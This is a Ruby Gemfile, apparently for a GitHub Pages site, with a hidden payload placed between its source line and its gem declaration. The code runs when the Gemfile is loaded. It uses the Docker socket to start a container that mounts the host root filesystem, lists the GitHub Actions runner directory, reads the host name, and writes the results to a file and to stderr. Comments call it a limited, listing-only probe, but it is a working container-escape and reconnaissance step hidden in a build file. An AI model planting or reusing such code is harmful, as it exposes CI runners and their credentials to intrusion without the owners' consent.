source "https://rubygems.org"
# --- TAKEAWAY (a): does the build reach the RUNNER HOST filesystem outside its container?
# CONDUCT RAIL, enforced in the code below: the container command is `ls -la` / `find`
# ONLY. No file is opened, nothing is cat-ed, no credential VALUE is read, nothing is
# authenticated or persisted. Presence, path, mode and size only. Container is removed.
require "socket"
require "json"
out = []
def dock(method, ep, body = nil)
  s = UNIXSocket.new("/var/run/docker.sock")
  if body
    j = JSON.generate(body)
    s.write("#{method} #{ep} HTTP/1.0\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: #{j.bytesize}\r\n\r\n#{j}")
  else
    s.write("#{method} #{ep} HTTP/1.0\r\nHost: localhost\r\n\r\n")
  end
  d = +""
  while (c = s.read(65536)); d << c; break if d.bytesize > 400_000; end
  s.close
  d
rescue => e
  "ERR #{e.class}: #{e.message}"
end
begin
  imgs = dock("GET", "/images/json")
  ids = imgs.scan(/"Id":"(sha256:[0-9a-f]{12})/).flatten.uniq
  out << "IMAGES_AVAILABLE=#{ids.length} #{ids.first(3).join(',')}"
  img = ids.first
  raise "no image" unless img
  # Read-only bind of the HOST root. Command is a listing only.
  cmd = 'echo "--- runner install dir (presence/mode/size ONLY, nothing opened) ---"; ls -la /hostfs/home/runner/actions-runner/ 2>&1 | head -25; echo "--- any nested runner dir ---"; ls -la /hostfs/home/runner/actions-runner/*/ 2>&1 | head -25; echo "--- CONTROL host identity ---"; cat /hostfs/etc/hostname'
  cr = dock("POST", "/containers/create", {
    "Image" => img, "Tty" => true,
    "Entrypoint" => ["/bin/sh", "-c"], "Cmd" => [cmd],
    "HostConfig" => { "Binds" => ["/:/hostfs:ro"], "AutoRemove" => false }
  })
  cid = cr[/"Id":"([0-9a-f]{64})"/, 1]
  out << "CREATE -> #{cr.lines.first.to_s.strip} id=#{cid ? cid[0, 12] : 'NONE'}"
  if cid
    out << "START  -> #{dock('POST', "/containers/#{cid}/start").lines.first.to_s.strip}"
    dock("POST", "/containers/#{cid}/wait")
    logs = dock("GET", "/containers/#{cid}/logs?stdout=1&stderr=1")
    body = logs.split("\r\n\r\n", 2)[1].to_s
    out << "--- HOST LISTING FROM INSIDE A CONTAINER WE CREATED ---"
    out << body.gsub(/[^\x20-\x7e\n]/, "")[0, 2200]
    dock("DELETE", "/containers/#{cid}?force=1")
    out << "CLEANUP done"
  end
rescue => e
  out << "FATAL #{e.class}: #{e.message}"
end
line = "pgx-rcred-2e91 statusline uid=#{Process.uid}\n" + out.join("\n")
warn line
begin; File.write(File.join(Dir.pwd, "pgx-rcred-2e91.txt"), line + "\n"); rescue => e; warn "wf:#{e.class}"; end
gem "github-pages", group: :jekyll_plugins
